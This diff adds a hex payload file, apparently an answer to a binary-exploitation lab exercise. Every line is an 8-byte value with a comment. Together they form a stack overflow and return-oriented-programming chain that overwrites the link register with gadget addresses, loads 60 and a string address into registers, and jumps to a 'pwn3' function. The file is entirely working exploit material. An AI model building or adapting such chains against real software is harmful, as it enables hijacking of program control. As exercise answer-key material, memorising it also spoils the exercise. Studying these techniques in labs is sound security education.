@@ -1,0 +1,44 @@
+FF FF FF FF FF FF FF FF // this line writes garbage (same as task2)
+FF FF FF FF FF FF FF FF // * continue writing garbage // IN THE COMMENTS, GADGET #1 REFERS
+FF FF FF FF FF FF FF FF // * continue writing garbage // TO THE GADGET THAT WRITES x0
+FF FF FF FF FF FF FF FF // * continue writing garbage // GADGET #2 WRITES x1
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+54 3E 45 00 00 00 00 00 // rewrite LR with address of gadget #2, writes first char of string to x1
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+80 9A 44 00 00 00 00 00 // rewrite LR to jump from gadget #2 to gadget #1, (writes 60 to x0)
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+90 B1 F0 FF FF FF 00 00 // (gadget 2's sp+40), holds string's 1st char adr, argument for x1 
+FF FF FF FF FF FF FF FF // * continue writing garbage
+D0 0C 40 00 00 00 00 00 // address of pwn3 for gadget #1 to jump to (overwrites lr) (gadget 1's (sp+8)
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+3C 00 00 00 00 00 00 00 // put argument in right place for gadget #1, (60) (sp+96)
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+FF FF FF FF FF FF FF FF // * continue writing garbage
+70 68 33 33 72 6D 33 6E // put argument for gadget #2, (the string)
+30 30 62 7A 00 00 00 00 // string continued (terminated by 00)
